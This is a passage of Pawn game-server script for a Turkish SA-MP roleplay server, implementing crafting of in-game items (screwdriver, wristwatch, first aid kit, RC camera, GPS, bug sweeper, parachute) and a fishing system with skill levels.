			SendClientMessage(playerid, COLOR_GRAD1, "yerlestirilebilirkamera(8000)	     alici(5000)");
			SendClientMessage(playerid, COLOR_GRAD1, "gps(1000)          bocektemizleyici(10000)");
			SendClientMessage(playerid, COLOR_GRAD1, "parasut(50)");
			SendClientMessage(playerid, COLOR_GREEN, "________________________________________________");
			SendClientMessage(playerid, COLOR_WHITE, "KULLANIM: /zanaat [Oyuncu ID/Ýsim] [craftname]");
			return 1;
		}
		if(strcmp(choice,"tornavida",true) == 0)
		{
			if(PlayerInfo[playerid][pMats] >= 1000)
			{
				price = 1000;
				weapon = 1;
			}
			else
			{
				SendClientMessage(playerid,COLOR_GREY,"   Yeterli materyal yok!");
				return 1;
			}
		}
		else if(strcmp(choice,"kolsaati",true) == 0)
		{
			if(PlayerInfo[playerid][pMats] >= 500)
			{
				price = 500;
				weapon = 3;
			}
			else
			{
				SendClientMessage(playerid,COLOR_GREY,"   Yeterli materyal yok!");
				return 1;
			}
		}
		else if(strcmp(choice,"tekerlek",true) == 0)
		{
			if(PlayerInfo[playerid][pMats] >= 250)
			{
				price = 250;
				weapon = 5;
			}
			else
			{
				SendClientMessage(playerid,COLOR_GREY,"   Yeterli materyal yok!");
				return 1;
			}
		}
		else if(strcmp(choice,"ilkyardim",true) == 0)
		{
			if(PlayerInfo[playerid][pMats] >= 1000)
			{
				price = 1000;
				weapon = 7;
			}
			else
			{
				SendClientMessage(playerid,COLOR_GREY,"   Yeterli materyal yok!");
				return 1;
			}
		}
		else if(strcmp(choice,"kamera",true) == 0)
		{
			if(PlayerInfo[playerid][pMats] >= 250)
			{
				price = 250;
				weapon = 8;
			}
			else
			{
				SendClientMessage(playerid,COLOR_GREY,"   Yeterli materyal yok!");
				return 1;
			}
		}
		else if(strcmp(choice,"yerlestirilebilirkamera",true) == 0)
		{
			if(PlayerInfo[playerid][pMats] >= 8000)
			{
				price = 8000;
				weapon = 9;
			}
			else
			{
				SendClientMessage(playerid,COLOR_GREY,"   Yeterli materyal yok!");
				return 1;
			}
		}
		else if(strcmp(choice,"alici",true) == 0)
		{
			if(PlayerInfo[playerid][pMats] >= 5000)
			{
				price = 5000;
				weapon = 10;
			}
			else
			{
				SendClientMessage(playerid,COLOR_GREY,"   Yeterli materyal yok!");
				return 1;
			}
		}
		else if(strcmp(choice,"gps",true) == 0)
		{
			if(PlayerInfo[playerid][pMats] >= 1000)
			{
				price = 1000;
				weapon = 11;
			}
			else
			{
				SendClientMessage(playerid,COLOR_GREY,"   Yeterli materyal yok!");
				return 1;
			}
		}

		else if(strcmp(choice,"bocektemizleyici",true) == 0)
		{
			if(PlayerInfo[playerid][pMats] >= 10000)
			{
				price = 10000;
				weapon = 12;
			}
			else
			{
				SendClientMessage(playerid,COLOR_GREY,"   Yeterli materyal yok!");
				return 1;
			}
		}

		else if(strcmp(choice,"parasut",true) == 0)
		{
			if(PlayerInfo[playerid][pMats] >= 50)
			{
				price = 50;
				weapon = 13;
			}
			else
			{
				SendClientMessage(playerid,COLOR_GREY,"   Yeterli materyal yok!");
				return 1;
			}
		}

		else { SendClientMessage(playerid,COLOR_GREY,"   Böyle bir zanaat yok!"); return 1; }
		if(ProxDetectorS(5.0, playerid, giveplayerid))
		{
			if(giveplayerid == playerid)
			{
				format(string, sizeof(string), "   Kendine bir adet %s verdin.", choice);
				PlayerPlaySound(playerid, 1052, 0.0, 0.0, 0.0);
				SendClientMessage(playerid, COLOR_GRAD1, string);
				PlayerPlaySound(playerid, 1052, 0.0, 0.0, 0.0);
				switch(PlayerInfo[playerid][pSex])
				{
					case 1: format(string, sizeof(string), "* %s materyali kullanarak birþey yaptý.", GetPlayerNameEx(playerid));
					case 2: format(string, sizeof(string), "* %s materyali kullanarak birþey yaptý.", GetPlayerNameEx(playerid));
				}
				ProxDetector(30.0, playerid, string, COLOR_PURPLE,COLOR_PURPLE,COLOR_PURPLE,COLOR_PURPLE,COLOR_PURPLE);

				PlayerInfo[playerid][pMats] -= price;
				//PlayerInfo[playerid][pCraftSkill]++;

				SetPVarInt(playerid, "ArmsTimer", 10); SetTimerEx("OtherTimerEx", 1000, false, "ii", playerid, TYPE_ARMSTIMER);
				switch(weapon) {
					case 1: {
						PlayerInfo[playerid][pScrewdriver]++;
						SendClientMessage(giveplayerid, COLOR_LIGHTBLUE, "/silahsat");
					}
					case 3: {
						PlayerInfo[playerid][pWristwatch]++;
						SendClientMessage(giveplayerid, COLOR_LIGHTBLUE, "/kolsaati");
					}
					case 5: {
						PlayerInfo[playerid][pTire]++;
						SendClientMessage(giveplayerid, COLOR_LIGHTBLUE, "/tamtamir");
					}
					case 7: {
						PlayerInfo[playerid][pFirstaid]++;
						SendClientMessage(giveplayerid, COLOR_LIGHTBLUE, "/ilkyardim");
					}
					case 8: {
						GivePlayerValidWeapon(playerid, 43, 50);
					}
					case 9: {
						PlayerInfo[playerid][pRccam]++;
						SendClientMessage(giveplayerid, COLOR_LIGHTBLUE, "/kamerayerlestir");
					}
					case 10: {
						PlayerInfo[playerid][pReceiver]++;
						SetPVarInt(playerid, "pReceiverMLeft", 40);
						SendClientMessage(giveplayerid, COLOR_LIGHTBLUE, "You will receive the next four department radio messages.");
					}
					case 11: {
						PlayerInfo[playerid][pGPS]++;
						SendClientMessage(giveplayerid, COLOR_LIGHTBLUE, "/gps");
					}
					case 12: {
						PlayerInfo[playerid][pSweep]++;
						PlayerInfo[playerid][pSweepLeft] = 3;
						SendClientMessage(giveplayerid, COLOR_LIGHTBLUE, "/bocektemizle");
					}
					case 13: {
						GivePlayerValidWeapon(playerid, 46, 99999);
					}
				}
				return 1;
			}

			format(string, sizeof(string), "* %s adlý kiþiye %s satmak istiyorsunuz.", GetPlayerNameEx(giveplayerid), choice);
			SendClientMessage(playerid, COLOR_LIGHTBLUE, string);
			format(string, sizeof(string), "* Zanaatkar %s sana %s satmaya çalýþýyor, (örnek: /kabulet zanaat).", GetPlayerNameEx(playerid), choice);
			SendClientMessage(giveplayerid, COLOR_LIGHTBLUE, string);
			CraftOffer[giveplayerid] = playerid;
			CraftId[giveplayerid] = weapon;
			CraftMats[giveplayerid] = price;
			format(CraftName[giveplayerid], 50, "%s", choice);
			SetPVarInt(playerid, "ArmsTimer", 10); SetTimerEx("OtherTimerEx", 1000, false, "ii", playerid, TYPE_ARMSTIMER);
			return 1;
		}
		else
		{
			SendClientMessage(playerid, COLOR_GREY, "Bu oyuncu yanýnda deðil.");
			return 1;
		}
	}
	else
	{
		SendClientMessage(playerid, COLOR_GRAD1, "Geçersiz oyuncu.");
		return 1;
	}
}

CMD:esyalarim(playerid, params[])
{
    new str[32];
    SendClientMessage(playerid, COLOR_GREEN, "________________________________________________");
	SendClientMessage(playerid, COLOR_YELLOW, "<< Zanaat Esyalari >>");
	format(str, sizeof(str), "Tornavida: %d", PlayerInfo[playerid][pScrewdriver]);
	SendClientMessage(playerid, COLOR_GRAD1, str);
	format(str, sizeof(str), "Kolsaati: %d Tire: %d", PlayerInfo[playerid][pWristwatch], PlayerInfo[playerid][pTire]);
	SendClientMessage(playerid, COLOR_GRAD1, str);
	format(str, sizeof(str), "Ilkyardim: %d   Rccam: %d", PlayerInfo[playerid][pFirstaid], PlayerInfo[playerid][pRccam]);
	SendClientMessage(playerid, COLOR_GRAD1, str);
	format(str, sizeof(str), "Alici: %d   GPS: %d", PlayerInfo[playerid][pReceiver], PlayerInfo[playerid][pGPS]);
	SendClientMessage(playerid, COLOR_GRAD1, str);
	format(str, sizeof(str), "Bocek Temizleyici: %d", PlayerInfo[playerid][pSweep]);
	SendClientMessage(playerid, COLOR_GRAD1, str);
	return 1;
}

CMD:ks(playerid, params[])
{
	return cmd_kolsaati(playerid, params);
}

CMD:kolsaati(playerid, params[])
{
	if(PlayerInfo[playerid][pWristwatch] > 0)
	{
		new string[128];
		if(GetPVarInt(playerid, "wristwatchonoff") == 0)
		{
			SetPVarInt(playerid, "wristwatchonoff", 1);
			new hour,minuite,second;
			gettime(hour,minuite,second);
			FixHour(hour);
			hour = shifthour;
			if(minuite < 10)
			{
				format(string, sizeof(string), "%d:0%d", hour, minuite);
			}
			else
			{
				format(string, sizeof(string), "%d:%d", hour, minuite);
			}
			TextDrawShowForPlayer(playerid, WristWatch);
			format(string, sizeof(string), "* %s kol saatini takar.", GetPlayerNameEx(playerid));
			ProxDetector(30.0, playerid, string, COLOR_PURPLE,COLOR_PURPLE,COLOR_PURPLE,COLOR_PURPLE,COLOR_PURPLE);
		}
		else
		{
			TextDrawHideForPlayer(playerid, WristWatch);
			DeletePVar(playerid, "wristwatchonoff");
			format(string, sizeof(string), "* %s kol saatini çýkarýr.", GetPlayerNameEx(playerid));
			ProxDetector(30.0, playerid, string, COLOR_PURPLE,COLOR_PURPLE,COLOR_PURPLE,COLOR_PURPLE,COLOR_PURPLE);
		}
	}
	else
	{
		SendClientMessage(playerid, COLOR_GRAD1, "Kol saatin yok!");
	}
	return 1;
}

CMD:ilkyardim(playerid, params[])
{
	if(GetPVarInt(playerid, "PBM") > 0)
	{
		SendClientMessage(playerid, COLOR_WHITE, "Paintball oynarken bunu yapamazsýn!");
		return 1;
	}
	if(GetPVarInt(playerid, "Injured") == 1)
	{
		SendClientMessage(playerid, COLOR_WHITE, "Yaralýyken bunu yapamazsýn.");
		return 1;
	}
 	if(PlayerBoxing[playerid] == 1)
  	{
   		SendClientMessage(playerid, COLOR_GREY, "Box Müsabakasýnda bunu yapamazsýn.");
     	return 1;
   	}
	if(PlayerInfo[playerid][pFirstaid] > 0)
	{
		if(GetPVarInt(playerid, "usingfirstaid") == 0)
		{
			new string[128];
			PlayerInfo[playerid][pFirstaid]--;
			SetPVarInt(playerid, "firstaid5", SetTimerEx("firstaid5", 5000, 1, "d", playerid));
			SetPVarInt(playerid, "firstaidexpire", SetTimerEx("firstaidexpire",10*60000, 0, "d", playerid));
			SetPVarInt(playerid, "usingfirstaid", 1);
			format(string, sizeof(string), "* %s adlý kiþi ilk yardým çantasýndan antibiyotik çýkarýr ve kullanýr.", GetPlayerNameEx(playerid));
			ProxDetector(30.0, playerid, string, COLOR_PURPLE,COLOR_PURPLE,COLOR_PURPLE,COLOR_PURPLE,COLOR_PURPLE);
		}
		else
		{
			SendClientMessage(playerid, COLOR_GRAD1, "Zaten Antibiyotik kullanýyorsun!");
		}
	}
	else
	{
		SendClientMessage(playerid, COLOR_GRAD1, "Ýlk yardým çantan yok!");
	}
	return 1;
}

CMD:kamerayerlestir(playerid, params[])
{
	if(PlayerInfo[playerid][pRccam] > 0)
	{
		new string[128];
		if(GetPVarInt(playerid, "rccam") == 0)
		{
			if(IsPlayerInAnyVehicle(playerid))
				return SendClientMessage(playerid, COLOR_GRAD1, "Araç içersindeyken kamera yerleþtiremezsin!");

			if(GetPlayerInterior(playerid) != 0 || GetPlayerVirtualWorld(playerid) != 0)
				return SendClientMessage(playerid, COLOR_GRAD1, "Bina içersine kamera yerleþtiremezsin!");

			PlayerInfo[playerid][pRccam]--;
			SetPVarInt(playerid, "rccam", 1);
			new Float:X, Float:Y, Float:Z;
			GetPlayerPos(playerid, X, Y, Z);
			SetPVarFloat(playerid, "rcX", X);
			SetPVarFloat(playerid, "rcY", Y);
			SetPVarFloat(playerid, "rcZ", Z);
			if(GetPVarInt(playerid, "rcveh") != 0)
			{
				DestroyVehicle(GetPVarInt(playerid, "rcveh"));
				VehicleRadioStation[GetPVarInt(playerid, "rcveh")] = 0;
			}
			SetPVarInt(playerid, "rcveh", AddStaticVehicle(594, X, Y, Z, 0, 0, 0));
			PutPlayerInVehicle(playerid, GetPVarInt(playerid, "rcveh"), 0);
			SetPVarInt(playerid, "rccamtimer", SetTimerEx("rccam", 60000, 0, "d", playerid));
			format(string, sizeof(string), "* %s zemine birþey yerleþtirir.", GetPlayerNameEx(playerid));
			ProxDetector(30.0, playerid, string, COLOR_PURPLE,COLOR_PURPLE,COLOR_PURPLE,COLOR_PURPLE,COLOR_PURPLE);
		}
		else
		{
			DestroyVehicle(GetPVarInt(playerid, "rcveh"));
			VehicleRadioStation[GetPVarInt(playerid, "rcveh")] = 0;
			SetPlayerPos(playerid, GetPVarFloat(playerid, "rcX"), GetPVarFloat(playerid, "rcY"), GetPVarFloat(playerid, "rcZ"));
			DeletePVar(playerid, "rccam");
			KillTimer(GetPVarInt(playerid, "rccamtimer"));
		}
	}
	else
	{
		if(GetPVarInt(playerid, "rccam") == 1)
		{
			DestroyVehicle(GetPVarInt(playerid, "rcveh"));
			VehicleRadioStation[GetPVarInt(playerid, "rcveh")] = 0;
			SetPlayerPos(playerid, GetPVarFloat(playerid, "rcX"), GetPVarFloat(playerid, "rcY"), GetPVarFloat(playerid, "rcZ"));
			DeletePVar(playerid, "rccam");
			KillTimer(GetPVarInt(playerid, "rccamtimer"));
			return 1;
		}
		SendClientMessage(playerid, COLOR_GRAD1, "Kameran yok!");
	}
	return 1;
}

CMD:gps(playerid, params[])
{
	if(PlayerInfo[playerid][pGPS] > 0)
	{
		new string[128];
		if(GetPVarInt(playerid, "gpsonoff") == 0)
		{
			format(string, sizeof(string), "* %s GPS cihazýný açar.", GetPlayerNameEx(playerid));
			ProxDetector(30.0, playerid, string, COLOR_PURPLE,COLOR_PURPLE,COLOR_PURPLE,COLOR_PURPLE,COLOR_PURPLE);
			SetPVarInt(playerid, "gpsonoff", 1);
			GPS[playerid] = TextDrawCreate(85.000000, 322.000000, "Yukleniyor..");
			TextDrawAlignment(GPS[playerid], 2);
			TextDrawBackgroundColor(GPS[playerid], 255);
			TextDrawFont(GPS[playerid], 0);
			TextDrawLetterSize(GPS[playerid], 0.809998, 1.500000);
			TextDrawColor(GPS[playerid], -1);
			TextDrawSetOutline(GPS[playerid], 1);
			TextDrawSetProportional(GPS[playerid], 1);
			TextDrawShowForPlayer(playerid, GPS[playerid]);
		}
		else
		{
			format(string, sizeof(string), "* %s GPS cihazýný kapatýr.", GetPlayerNameEx(playerid));
			ProxDetector(30.0, playerid, string, COLOR_PURPLE,COLOR_PURPLE,COLOR_PURPLE,COLOR_PURPLE,COLOR_PURPLE);
			DeletePVar(playerid, "gpsonoff");
			TextDrawDestroy(GPS[playerid]);
		}
	}

	else
	{
		SendClientMessage(playerid, COLOR_GRAD1, "GPS cihazýn yok!");
	}
	return 1;
}

CMD:bocektemizle(playerid, params[])
{
	if(PlayerInfo[playerid][pSweep] > 0)
	{
		if(PlayerInfo[playerid][pSweepLeft] > 0)
		{
			new string[128], giveplayerid;
			if(sscanf(params, "u", giveplayerid)) return SendClientMessage(playerid, COLOR_WHITE, "KULLANIM: /bocektemizle [Oyuncu ID/Ýsim]");

			if(!ProxDetectorS(4.0, playerid, giveplayerid)) return SendClientMessage(playerid, COLOR_GRAD1, "Hedefe daha fazla yaklaþman gerekiyor.");
			PlayerInfo[playerid][pSweepLeft]--;
			format(string, sizeof(string), "* %s eliyle  %s adlý kiþinin kýyafetine dokunur, tozlarý silkeler...", GetPlayerNameEx(playerid), GetPlayerNameEx(giveplayerid));
			ProxDetector(30.0, playerid, string, COLOR_PURPLE,COLOR_PURPLE,COLOR_PURPLE,COLOR_PURPLE,COLOR_PURPLE);
			if(PlayerInfo[giveplayerid][pBugged] > 0)
			{
				PlayerInfo[giveplayerid][pBugged] = 0;
				format(string, sizeof(string), "* Çok kýsa bir süre %s adlý kiþinin üstünde ufak bir ýþýk yanar.", GetPlayerNameEx(giveplayerid));
				ProxDetector(30.0, playerid, string, COLOR_PURPLE,COLOR_PURPLE,COLOR_PURPLE,COLOR_PURPLE,COLOR_PURPLE);
				format(string, sizeof(string), "(bug) %s: *statik*", GetPlayerNameEx(giveplayerid));
				SendBugMessage(2, COLOR_LIGHTGREEN, string);
			}
			else
			{
				ProxDetector(30.0, playerid, "Hiçbirþey olmadý.", COLOR_PURPLE,COLOR_PURPLE,COLOR_PURPLE,COLOR_PURPLE,COLOR_PURPLE);
			}
		}
		else
		{
			SendClientMessage(playerid, COLOR_GRAD1, "Böceðinin bataryasý bitti!");
			PlayerInfo[playerid][pSweep]--;
			PlayerInfo[playerid][pSweepLeft] = 3;
		}
	}
	else
	{
		SendClientMessage(playerid, COLOR_GRAD1, "Üzerinde herhangi bir böcek yok!");
	}
	return 1;
}

CMD:alici(playerid, params[])
{
	if(PlayerInfo[playerid][pReceiver] > 0)
	{
		if(!GetPVarType(playerid, "pReceiverOn"))
		{
			SendClientMessage(playerid, COLOR_YELLOW, "Alýcý'ný aktif ettin.");
			SetPVarInt(playerid, "pReceiverOn", 1);
		}
		else
		{
			SendClientMessage(playerid, COLOR_YELLOW, "Alýcý'ný deaktif ettin.");
			DeletePVar(playerid, "pReceiverOn");
		}
	}
	else
	{
		SendClientMessage(playerid, COLOR_GRAD1, "Alýcýn bulunmuyor.");
	}
	return 1;
}

CMD:lideryardim(playerid, params[])
{
    if(PlayerInfo[playerid][pLeader] >= 1) {
        SendClientMessage(playerid, COLOR_GREEN,"_______________________________________");
        SendClientMessage(playerid, COLOR_WHITE,"*** LÝDER YARDIM *** - Daha fazla bilgi için bir komut yazýn.");
        SendClientMessage(playerid, COLOR_GRAD3,"*** LÝDERLER *** /davetet /olusumdanat /rutbever /offlineolusumdanat");
    }
    else {
        SendClientMessage(playerid, COLOR_GREY, "Lider deðilsin.");
    }
    return 1;
}

CMD:balikyardim(playerid, params[])
{
    SendClientMessage(playerid, COLOR_GREEN,"_______________________________________");
    SendClientMessage(playerid, COLOR_WHITE,"*** BALIK YARDIM *** - daha fazla bilgi için bir komut yazýn.");
    SendClientMessage(playerid, COLOR_GRAD3,"*** BALIK TUTMA *** /baliktut (balýk yakalamaya çalýþ)   /baliklarim (Ne kadar balýðýn var)");
    SendClientMessage(playerid, COLOR_GRAD3,"*** BALIK TUTMA *** /baligigeriat (Yakaladýðýn son balýðý denize geri at.)   /baliklarigeriat");
    SendClientMessage(playerid, COLOR_GRAD3,"*** BALIK TUTMA *** /balikbirak (Balýklarýndan seçtiðini denize geri at.)");
    SendClientMessage(playerid, COLOR_GRAD3,"*** BALIK TUTMA *** /baliksat (Balýklarýný Markette sat) /tumbaliklarisat");
    return 1;
}

CMD:baliktut(playerid, params[])
{
	if(PlayerInfo[playerid][pFishes] > 5)
	{
		SendClientMessage(playerid, COLOR_GREY, "Yeterince balýk yalakadýn, Bazýlarýný serbest býrakmalýsýn.");
		return 1;
	}
	if(Fishes[playerid][pWeight1] > 0 && Fishes[playerid][pWeight2] > 0 && Fishes[playerid][pWeight3] > 0 && Fishes[playerid][pWeight4] > 0 && Fishes[playerid][pWeight5] > 0)
	{
		SendClientMessage(playerid, COLOR_GREY, "5 balýktan fazlasýný taþýyamazsýn - Balýklarý satabilir, Denize geri atabilirsin.");
		return 1;
	}

	new string[128];
	new Veh = GetPlayerVehicleID(playerid);
	if((IsAtFishPlace(playerid)) || IsABoat(Veh))
	{
		new Caught;
		new rand;
		new fstring[MAX_PLAYER_NAME];
		new Level = PlayerInfo[playerid][pFishSkill];
		if(Level >= 0 && Level < 50) { Caught = random(20)-7; }
		else if(Level >= 50 && Level < 100) { Caught = random(50)-20; }
		else if(Level >= 100 && Level < 200) { Caught = random(100)-50; }
		else if(Level >= 200 && Level < 400) { Caught = random(160)-60; }
		else if(Level >= 400) { Caught = random(180)-70; }
		rand = random(FishNamesNumber);
		if(Caught <= 0)
		{
			SendClientMessage(playerid, COLOR_GREY, "Misina koptu.");
			return 1;
		}
		else if(rand == 0)
		{
			SendClientMessage(playerid, COLOR_GREY, "Ceket yakaladýn ve çöpe attýn.");
			return 1;
		}
		else if(rand == 4)
		{
			SendClientMessage(playerid, COLOR_GREY, "Pantolon yakaladýn ve çöpe attýn.");
			return 1;
		}
		else if(rand == 7)
		{
			SendClientMessage(playerid, COLOR_GREY, "Balýk oltadan kurtuldu.");
			return 1;
		}
		else if(rand == 10)
		{
			SendClientMessage(playerid, COLOR_GREY, "Ayakkabý yakaladýn ve çöpe attýn.");
			return 1;
		}
		else if(rand == 13)
		{
			SendClientMessage(playerid, COLOR_GREY, "Çöp yakaladýn ve çöp kutusuna attýn.");
			return 1;
		}
		else if(rand == 20)
		{
			new mrand = random(50);
			format(string, sizeof(string), "* Para dolu bir çanta yakaladýn (%d$).", mrand);
			SendClientMessage(playerid, COLOR_LIGHTBLUE, string);
			GivePlayerCash(playerid, mrand);
			return 1;
		}
		if(Fishes[playerid][pWeight1] == 0)
		{
			PlayerInfo[playerid][pFishes] += 1;
			#if defined DOUBLE_EXP_ENABLED
				new hour,minuite,second;
				gettime(hour,minuite,second);
				if(DoubleEXPcheck(hour))
				{
				    PlayerInfo[playerid][pFishSkill] += 2;
				    SendClientMessage(playerid, COLOR_YELLOW, "Ýki kat exp etkinliðinden dolayý 2 Yetenek Puaný kazandýnýz.");
				}
				else
				{
					SendClientMessage(playerid, COLOR_YELLOW, "Ýki kat exp etkinliði saatinde deðilseniz yalnýzca 1 Yetenek Puaný kazanýrsýnýz.");
					PlayerInfo[playerid][pFishSkill]++;
				}
			#else
			    PlayerInfo[playerid][pFishSkill] += 1;
			#endif

			format(fstring, sizeof(fstring), "%s", FishNames[rand]);
			strmid(Fishes[playerid][pFish1], fstring, 0, strlen(fstring), 255);
			Fishes[playerid][pWeight1] = Caught;
			format(string, sizeof(string), "* %s adlý balýðý yakaladýn, Aðýrlýk: %d kilogram .", Fishes[playerid][pFish1], Caught);
			SendClientMessage(playerid, COLOR_LIGHTBLUE, string);
			Fishes[playerid][pLastWeight] = Caught;
			Fishes[playerid][pLastFish] = 1;
			Fishes[playerid][pFid1] = rand;
			Fishes[playerid][pFishID] = rand;
			if(Caught > PlayerInfo[playerid][pBiggestFish])
			{
				format(string, sizeof(string), "* Eski balýk yakalama rekorun %d kilogramdý, Yeni rekorun %d kilogram.", PlayerInfo[playerid][pBiggestFish], Caught);
				SendClientMessage(playerid, COLOR_LIGHTBLUE, string);
				PlayerInfo[playerid][pBiggestFish] = Caught;
			}
		}
		else if(Fishes[playerid][pWeight2] == 0)
		{
			PlayerInfo[playerid][pFishes] += 1;
			#if defined DOUBLE_EXP_ENABLED
				new hour,minuite,second;
				gettime(hour,minuite,second);
				if(DoubleEXPcheck(hour))
				{
				    PlayerInfo[playerid][pFishSkill] += 2;
				    SendClientMessage(playerid, COLOR_YELLOW, "Ýki kat exp etkinliðinden dolayý 2 Yetenek Puaný kazandýnýz.");
				}
				else
				{
					SendClientMessage(playerid, COLOR_YELLOW, "Ýki kat exp etkinliði saatinde deðilseniz yalnýzca 1 Yetenek Puaný kazanýrsýnýz.");
					PlayerInfo[playerid][pFishSkill]++;
				}
			#else
			    PlayerInfo[playerid][pFishSkill] += 1;
			#endif

			format(fstring, sizeof(fstring), "%s", FishNames[rand]);
			strmid(Fishes[playerid][pFish2], fstring, 0, strlen(fstring), 255);
			Fishes[playerid][pWeight2] = Caught;
			format(string, sizeof(string), "* %s adlý balýðý yakaladýn, Aðýrlýk: %d kilogram.", Fishes[playerid][pFish2], Caught);
			SendClientMessage(playerid, COLOR_LIGHTBLUE, string);
			Fishes[playerid][pLastWeight] = Caught;
			Fishes[playerid][pLastFish] = 2;
			Fishes[playerid][pFid2] = rand;
			Fishes[playerid][pFishID] = rand;
			if(Caught > PlayerInfo[playerid][pBiggestFish])
			{
				format(string, sizeof(string), "* Eski balýk yakalama rekorun %d kilogramdý, Yeni rekorun %d kilogram.", PlayerInfo[playerid][pBiggestFish], Caught);
				SendClientMessage(playerid, COLOR_LIGHTBLUE, string);
				PlayerInfo[playerid][pBiggestFish] = Caught;
			}
		}
		else if(Fishes[playerid][pWeight3] == 0)
		{
			PlayerInfo[playerid][pFishes] += 1;
			#if defined DOUBLE_EXP_ENABLED
				new hour,minuite,second;
				gettime(hour,minuite,second);
				if(DoubleEXPcheck(hour))
				{
				    PlayerInfo[playerid][pFishSkill] += 2;
				    SendClientMessage(playerid, COLOR_YELLOW, "Ýki kat exp etkinliðinden dolayý 2 Yetenek Puaný kazandýnýz.");
				}
				else
				{
					SendClientMessage(playerid, COLOR_YELLOW, "Ýki kat exp etkinliði saatinde deðilseniz yalnýzca 1 Yetenek Puaný kazanýrsýnýz.");
					PlayerInfo[playerid][pFishSkill]++;
				}
			#else
			    PlayerInfo[playerid][pFishSkill] += 1;
			#endif

			format(fstring, sizeof(fstring), "%s", FishNames[rand]);
			strmid(Fishes[playerid][pFish3], fstring, 0, strlen(fstring), 255);
			Fishes[playerid][pWeight3] = Caught;
			format(string, sizeof(string), "* %s adlý balýðý yakaladýn, Aðýrlýk: %d kilogram.", Fishes[playerid][pFish3], Caught);
			SendClientMessage(playerid, COLOR_LIGHTBLUE, string);
			Fishes[playerid][pLastWeight] = Caught;
			Fishes[playerid][pLastFish] = 3;
			Fishes[playerid][pFid3] = rand;
			Fishes[playerid][pFishID] = rand;
			if(Caught > PlayerInfo[playerid][pBiggestFish])
			{
				format(string, sizeof(string), "* Eski balýk yakalama rekorun %d kilogramdý, Yeni rekorun %d kilogram.", PlayerInfo[playerid][pBiggestFish], Caught);
				SendClientMessage(playerid, COLOR_LIGHTBLUE, string);
				PlayerInfo[playerid][pBiggestFish] = Caught;
			}
		}
		else if(Fishes[playerid][pWeight4] == 0)
		{
			PlayerInfo[playerid][pFishes] += 1;
			#if defined DOUBLE_EXP_ENABLED
				new hour,minuite,second;
				gettime(hour,minuite,second);
				if(DoubleEXPcheck(hour))
				{
				    PlayerInfo[playerid][pFishSkill] += 2;
				    SendClientMessage(playerid, COLOR_YELLOW, "Ýki kat exp etkinliðinden dolayý 2 Yetenek Puaný kazandýnýz.");
				}
				else
				{
					SendClientMessage(playerid, COLOR_YELLOW, "Ýki kat exp etkinliði saatinde deðilseniz yalnýzca 1 Yetenek Puaný kazanýrsýnýz.");
					PlayerInfo[playerid][pFishSkill]++;
				}
			#else
			    PlayerInfo[playerid][pFishSkill] += 1;
			#endif

			format(fstring, sizeof(fstring), "%s", FishNames[rand]);
			strmid(Fishes[playerid][pFish4], fstring, 0, strlen(fstring), 255);
			Fishes[playerid][pWeight4] = Caught;
			format(string, sizeof(string), "* %s adlý balýðý yakaladýn, Aðýrlýk: %d kilogram.", Fishes[playerid][pFish4], Caught);
			SendClientMessage(playerid, COLOR_LIGHTBLUE, string);
			Fishes[playerid][pLastWeight] = Caught;
			Fishes[playerid][pLastFish] = 4;
			Fishes[playerid][pFid4] = rand;
			Fishes[playerid][pFishID] = rand;
			if(Caught > PlayerInfo[playerid][pBiggestFish])
			{
				format(string, sizeof(string), "* Eski balýk yakalama rekorun %d kilogramdý, Yeni rekorun %d kilogram.", PlayerInfo[playerid][pBiggestFish], Caught);
				SendClientMessage(playerid, COLOR_LIGHTBLUE, string);
				PlayerInfo[playerid][pBiggestFish] = Caught;
			}
		}
		else if(Fishes[playerid][pWeight5] == 0)
		{
			PlayerInfo[playerid][pFishes] += 1;
			#if defined DOUBLE_EXP_ENABLED
				new hour,minuite,second;
				gettime(hour,minuite,second);
				if(DoubleEXPcheck(hour))
				{
				    PlayerInfo[playerid][pFishSkill] += 2;
				    SendClientMessage(playerid, COLOR_YELLOW, "Ýki kat exp etkinliðinden dolayý 2 Yetenek Puaný kazandýnýz.");
				}
				else
				{
					SendClientMessage(playerid, COLOR_YELLOW, "Ýki kat exp etkinliði saatinde deðilseniz yalnýzca 1 Yetenek Puaný kazanýrsýnýz.");
					PlayerInfo[playerid][pFishSkill]++;
				}
			#else
			    PlayerInfo[playerid][pFishSkill] += 1;
			#endif

			format(fstring, sizeof(fstring), "%s", FishNames[rand]);
			strmid(Fishes[playerid][pFish5], fstring, 0, strlen(fstring), 255);
			Fishes[playerid][pWeight5] = Caught;
			format(string, sizeof(string), "* %s adlý balýðý yakaladýn, Aðýrlýk: %d kilogram.", Fishes[playerid][pFish5], Caught);
			SendClientMessage(playerid, COLOR_LIGHTBLUE, string);
			Fishes[playerid][pLastWeight] = Caught;
			Fishes[playerid][pLastFish] = 5;
			Fishes[playerid][pFid5] = rand;
			Fishes[playerid][pFishID] = rand;
			if(Caught > PlayerInfo[playerid][pBiggestFish])
			{
				format(string, sizeof(string), "* Eski balýk yakalama rekorun %d kilogramdý, Yeni rekorun %d kilogram.", PlayerInfo[playerid][pBiggestFish], Caught);
				SendClientMessage(playerid, COLOR_LIGHTBLUE, string);
				PlayerInfo[playerid][pBiggestFish] = Caught;
			}
		}
		else
		{
			SendClientMessage(playerid, COLOR_GREY, "Balýðýn için üzerinde boþ yer yok, /balikyardim.");
			return 1;
		}
		if(PlayerInfo[playerid][pFishSkill] == 50)
		{ SendClientMessage(playerid, COLOR_YELLOW, "* Balýk yeteneðin 2 Level oldu, Þimdi daha büyük balýk tutabilirsin."); }
		else if(PlayerInfo[playerid][pFishSkill] == 100)
		{ SendClientMessage(playerid, COLOR_YELLOW, "* Balýk yeteneðin 3 Level oldu, Þimdi daha büyük balýk tutabilirsin."); }
		else if(PlayerInfo[playerid][pFishSkill] == 200)
		{ SendClientMessage(playerid, COLOR_YELLOW, "* Balýk yeteneðin 4 Level oldu, Þimdi daha büyük balýk tutabilirsin."); }
		else if(PlayerInfo[playerid][pFishSkill] == 400)
		{ SendClientMessage(playerid, COLOR_YELLOW, "* Balýk yeteneðin 5 Level oldu, Þimdi daha büyük balýk tutabilirsin."); }
	}
	else
	{
		SendClientMessage(playerid, COLOR_GREY, "Santa Maria Sahilinde deðilsin / Balýkçý teknesinde deðilsin.");
		return 1;
	}
	return 1;
}

CMD:baliklarim(playerid, params[])
{
	new string[128];

	SendClientMessage(playerid, COLOR_WHITE, "|__________________ BALIKLAR __________________|");
	format(string, sizeof(string), "** (1) Balýk: %s.   Aðýrlýk: %d.", Fishes[playerid][pFish1], Fishes[playerid][pWeight1]);
	SendClientMessage(playerid, COLOR_GREY, string);
